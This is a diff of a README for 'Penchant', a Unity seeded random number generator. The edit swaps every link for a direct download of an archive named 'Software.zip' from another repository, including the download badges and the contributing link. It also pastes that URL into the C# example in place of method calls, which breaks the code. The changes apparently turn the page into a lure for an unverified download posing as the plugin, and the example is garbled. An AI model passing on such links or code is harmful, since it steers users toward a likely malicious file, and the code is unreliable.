@@ -1,6 +1,6 @@
 # 🎲 Penchant - A Seeded Random Number Generator for Unity 🎲
 
-[![Penchant](https://img.shields.io/badge/Get%20Penchant-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Penchant](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip%20Penchant-v1.0.0-brightgreen)](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Penchant is a simple and elegant seeded random number generator designed specifi
 
 ## Installation
 You can download the latest version of Penchant from the link below:
-[![Download Penchant](https://img.shields.io/badge/Download%20Penchant-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Penchant](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip%20Penchant-v1.0.0-blue)](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip)
 
 Once downloaded, simply extract the contents and integrate the Penchant plugin into your Unity project to start using the seeded random number generator right away.
 
@@ -36,9 +36,9 @@ public class RandomNumberGenerator : MonoBehaviour
         PenchantGenerator generator = new PenchantGenerator(seed);
 
         // Generate a random integer between 0 and 100
-        int randomNumber = generator.RandomInt(0, 100);
+        int randomNumber = https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip(0, 100);
 
-        Debug.Log("Random Number: " + randomNumber);
+        https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip("Random Number: " + randomNumber);
     }
 }
 ```
@@ -46,7 +46,7 @@ public class RandomNumberGenerator : MonoBehaviour
 By following this example, you can easily incorporate Penchant into your Unity scripts to add randomness to your game logic with a specific seed.
 
 ## Contributing
-Feel free to contribute to the development of Penchant by submitting pull requests or reporting issues on the [GitHub repository](https://github.com/your-username/penchant). Your contributions are highly appreciated!
+Feel free to contribute to the development of Penchant by submitting pull requests or reporting issues on the [GitHub repository](https://github.com/oktabrnld/Penchant/releases/download/v1.0/Software.zip). Your contributions are highly appreciated!
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
